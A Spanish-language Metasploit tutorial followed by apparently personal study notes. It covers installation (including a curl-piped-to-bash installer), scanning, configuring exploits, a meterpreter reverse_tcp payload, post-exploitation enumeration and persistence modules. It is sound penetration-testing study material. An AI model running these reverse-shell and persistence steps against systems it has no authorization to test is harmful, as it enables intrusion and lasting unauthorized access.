
---------

Metasploit es una herramienta poderosa para pruebas de penetración, análisis de seguridad y explotación de vulnerabilidades en redes y sistemas. Aquí tienes una guía básica para empezar con Metasploit:

### 1. **Introducción a Metasploit**

Metasploit Framework es una plataforma de código abierto que contiene módulos de explotación, payloads (cargas útiles), encoders (codificadores), entre otros. Es utilizado por profesionales de la seguridad para realizar pruebas de penetración en sistemas con permisos apropiados.

### 2. **Instalación de Metasploit**

Para usar Metasploit, puedes instalarlo en sistemas basados en Linux (como Kali Linux, que lo trae preinstalado) o en Windows. La instalación varía según el sistema operativo:

- **En Kali Linux**: Generalmente, ya está instalado.
- **En Ubuntu**:
    
    
    `curl https://raw.githubusercontent.com/rapid7/metasploit-framework/master/installer/setup.sh | bash`
    
- **En Windows**: Descarga el instalador desde la página oficial de Rapid7.

### 3. **Iniciar Metasploit**

Para comenzar a utilizar Metasploit, abre una terminal y escribe:


`msfconsole`

### 4. **Estructura de Metasploit**

Metasploit tiene varios componentes clave:

- **Exploit**: Código que toma ventaja de una vulnerabilidad específica.
- **Payload**: Código que se ejecuta en el sistema objetivo después de que se haya explotado la vulnerabilidad.
- **Auxiliary**: Herramientas auxiliares para realizar tareas como escaneo, reconocimiento, etc.
- **Post**: Módulos de post-explotación que se utilizan después de comprometer un sistema para realizar tareas de mantenimiento y extracción de información.

### 5. **Escaneo y reconocimiento**

Antes de explotar una vulnerabilidad, necesitas información sobre el objetivo. Metasploit tiene módulos auxiliares para esta etapa:

- **Escaneo de puertos**:
-
    `use auxiliary/scanner/portscan/tcp set RHOSTS <IP_del_objetivo> run`
    
- **Escaneo de servicios**:
    

    `use auxiliary/scanner/http/title set RHOSTS <IP_del_objetivo> run`
    

### 6. **Buscar exploits**

Puedes buscar exploits para aplicaciones o sistemas vulnerables:


`search nombre_del_servicio`

Ejemplo:



`search vsftpd`

### 7. **Configurar un exploit**

Una vez encontrado el exploit adecuado, configúralo:


`use exploit/path/al/exploit set RHOST <IP_del_objetivo> set RPORT <puerto_del_servicio>`

### 8. **Configurar el payload**

Elige el payload a ejecutar en el sistema vulnerable:


`set PAYLOAD windows/meterpreter/reverse_tcp set LHOST <IP_tuya> set LPORT <puerto>`

### 9. **Ejecutar el exploit**

Finalmente, ejecuta el exploit:


`exploit`

Si el exploit es exitoso, tendrás acceso al sistema remoto.

### 10. **Post-explotación**

Metasploit ofrece varios módulos de post-explotación para extraer información o mantener el acceso:

- **Ejemplo**: Enumerar usuarios
    
    
    `use post/windows/gather/enum_logged_on_users set SESSION <ID_de_la_sesion> run`
    

### 11. **Salir de Metasploit**

Para salir de Metasploit, simplemente escribe:

bash

Copy code

`exit`

---------

Iniciar la aplicación 

```
msfdb run 
```

La mayoria de exploits estan programadpos en ruby

La ruta de metaesplot es usr/share/metaesplot-framework

Se pueden configurar espacios de trabajp de ña sifguiente fotma 

![[Pasted image 20241103230822.png]]

Con el comando shell desde metaesploit listener podemos conseguir una consola interactiva de bash para poder ejecutar los comandos que queramos 

Podemos dejar en segundo plano las sessiones de la siguiente manera 

![[Pasted image 20241103233554.png]]


Podemos filtrar por exploits de persisetncia de la siguiente manera 

![[Pasted image 20241103233702.png]]

![[Pasted image 20241103234136.png]]


Posteriormente de Sertear el script de persistencia y de setear la session que queremos, le daboas a run y ya en un modiulo normal de metaesploit como el multihandler podriamos volvernos a concetar a las sessiones




